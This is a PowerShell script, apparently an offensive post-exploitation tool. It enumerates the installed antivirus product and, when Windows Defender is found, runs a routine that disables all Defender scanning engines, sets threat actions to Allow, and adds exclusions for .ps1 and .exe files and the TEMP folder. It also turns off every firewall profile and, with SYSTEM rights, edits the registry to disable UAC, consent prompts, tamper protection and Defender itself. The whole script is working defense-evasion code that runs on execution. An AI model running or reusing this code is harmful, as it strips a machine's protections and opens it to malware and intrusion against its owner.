function Test-Administrator{$user=[Security.Principal.WindowsIdentity]::GetCurrent();(New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)};
function Get-LHSAntiVirusProduct{[CmdletBinding()]param([parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)][Alias('CN')][String[]]$ComputerName=$env:computername)begin{Set-StrictMode -Version Latest;${CmdletName}=$Pscmdlet.MyInvocation.MyCommand.Name;Write-Host "[+] Enumerating the current active PSP..."}process{foreach($Computer in $computerName){if(Test-Connection -ComputerName $Computer -count 2 -quiet){try{[system.Version]$OSVersion=(Get-WmiObject win32_operatingsystem -computername $Computer).version;if($OSVersion -ge [system.version]'6.0.0.0'){Write-Verbose "OS Windows Vista/Server 2008 or newer detected.";$AntiVirusProduct=Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct -ComputerName $Computer -ErrorAction Stop}else{Write-Verbose "Windows 2000, 2003, XP detected";$AntiVirusProduct=Get-WmiObject -Namespace root\SecurityCenter -Class AntiVirusProduct -ComputerName $Computer -ErrorAction Stop};Write-Verbose "[+] Enumerating the PSP State";$productState=$AntiVirusProduct.productState;$hex=[convert]::ToString($productState[0], 16).PadLeft(6,'0');$WSC_SECURITY_PRODUCT_STATE=$hex.Substring(2,2);$WSC_SECURITY_SIGNATURE_STATUS=$hex.Substring(4,2);$RealTimeProtectionStatus=switch ($WSC_SECURITY_PRODUCT_STATE){"00" {"OFF"};"01" {"EXPIRED"};"10" {"ON"};"11" {"SNOOZED"};default {"UNKNOWN"}};$DefinitionStatus=switch ($WSC_SECURITY_SIGNATURE_STATUS){"00" {"UP_TO_DATE"};"10" {"OUT_OF_DATE"};default {"UNKNOWN"}};$AV=$Null;$AV=New-Object -TypeName PSObject -ErrorAction Stop -Property @{ComputerName = $AntiVirusProduct.__Server; Name = $AntiVirusProduct.displayName;ProductExecutable = $AntiVirusProduct.pathToSignedProductExe;ReportingExecutable = $AntiVirusProduct.pathToSignedReportingExe;DefinitionStatus = $DefinitionStatus;RealTimeProtectionStatus = $RealTimeProtectionStatus;ProductState = $productState;} | Select-Object ComputerName,Name,ProductExecutable,ReportingExecutable,DefinitionStatus,RealTimeProtectionStatus,ProductState;return $AV}catch{Write-Error "\\$Computer : WMI Error";Write-Error $_}}else{Write-Warning "\\$computer DO NOT reply to ping"}}}end{Write-Host "[+] Get-LHSAntiVirusProduct completed!"}};
function Disable-AV{param($agressive=$true,$exclPath=$env:TEMP)if(!(Test-Administrator)){Write-Host "[-] Disable-AV needs to be ran from a High-Integrity Administrator process.";return};$isSystem=$($(whoami)-eq"nt authority\system");Write-Host "[+] Attempting to Disable UAC, Firewalls, and Windows Defender with Path Exclusions and Defender Preferences.";$defender=(Get-MpComputerStatus);if($defender.IsTamperProtected){if($isSystem){Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4}else{Write-Host "[-] Tamper Protection Detected. Unable to automatically turn off Defender.";Write-Host "[*] if you have GUI access, Turn off Tamper Protection in Windows Security > Virus & Threat Protection";Write-Host "[*] Otherwise, you must run this script with SYSTEM privileges";return}};Write-Host "[+] Disabling Scanning Engines (Set-MpPreference)";foreach($cmd in $(Get-Command Set-MPPreference).Parameters.Values){$action=$cmd.Name;if($action -like "Disable*"){$errorChoice='ErrorAction';$params=@{$action=$true;$errorChoice='SilentlyContinue'};Write-Host "    [*] Disabling $($action.Substring(7))";Set-MPPreference @params}elseif($action -like "Enable*"){$errorChoice='ErrorAction';if($action -like "*NetworkProtection" -or $action -like "*ControlledFolderAccess"){$params=@{$action='Disabled';$errorChoice='SilentlyContinue'}}else{$params=@{$action=$false;$errorChoice='SilentlyContinue'}};Write-Host "    [*] Disabling$($action.Substring(6))";Set-MPPreference @params}};Write-Host "[+] Setting default discovered threat actions to Allow (Set-MpPreference)";Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue;Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue;Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue;Write-Host "[+] Adding Exclusion to '$($exclPath)', PS1s, EXEs, and disabling Firewalls";Set-MpPreference -ExclusionExtension "ps1" -ErrorAction SilentlyContinue;Set-MpPreference -ExclusionExtension "exe" -ErrorAction SilentlyContinue;Add-MpPreference -ExclusionPath $exclPath;Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;if($isSystem){Write-Host "[*] Attempting to disable UAC, RTP, Tamper Protection, and Defender through the Registry";Write-Host "[+] Disabling Realtime Protection (HKLM Hive)";Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SpyNetReporting -Value 0;Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SubmitSamplesConsent -Value 0;Write-Host "[+] Allowing admins to perform elevated actions without consent prompt popup";Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0;if($aggressive){Write-Host "[*] Agressive mode on. Modifying values that require a reboot to take effect";Write-Host "[+] Disabling UAC (HKLM Hive)";Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0;$curVersion=($defender.AMServiceVersion).Split('.');$safeVersion=("4.18.2108.4").Split('.');$safe=$true;for(($i=0);$i -lt $safeVersion.Count;$i++){if($curVersion[$i] -lt $safeVersion[$i]){$safe=$false;break}};if($safe){Write-Host "[-] Unable to Disable Microsoft Defender Antivirus on Windows Defender v$($defender.AMServiceVersion).";Write-Host "[-] Windows Defender versions after 4.18.2108.4 ignore the registry key."}else{Write-Host "[+] Windows Defender version " + $defender.AMServiceVersion + " vulnerable to disabling.";Write-Host "[+] Disabling Defender (HKLM Hive)";Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1;Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1}}}else{Write-Host "[-] Run with SYSTEM integrity to disable UAC, TP, Tamper Protection, and Defender through the Registry!"};Write-Host "[+] Disable-AV Completed!"};
$AV=Get-LHSAntiVirusProduct;$AV;if($AV.ProductExecutable-Like"*windowsdefender://*"){Disable-AV}elseif($AV.Count -eq 0){Write-Host "[-] No AV provided. Assumming Windows Defender."; Disable-AV}else{Write-Host "Unsupported PSP '$($AV.ProductExecutable)'. Disabling AV only supported with Windows Defender"}